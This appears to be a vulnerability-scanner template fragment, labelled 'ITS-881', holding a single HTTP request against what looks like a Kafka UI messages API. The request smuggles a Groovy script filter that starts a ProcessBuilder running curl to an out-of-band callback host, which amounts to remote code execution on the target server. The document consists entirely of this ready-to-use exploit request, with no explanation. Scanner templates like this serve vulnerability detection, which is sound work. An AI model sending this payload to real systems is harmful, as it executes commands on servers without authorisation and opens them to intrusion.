# Vulnerable: ITS-881
GET /api/clusters/{{cluster-name}}/topics/{{topic-name}}/messages?q=new+ProcessBuilder%28%22curl%22%2C%22{{interactsh-url}}%22%29.start%28%29&filterQueryType=GROOVY_SCRIPT&attempt=7&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING
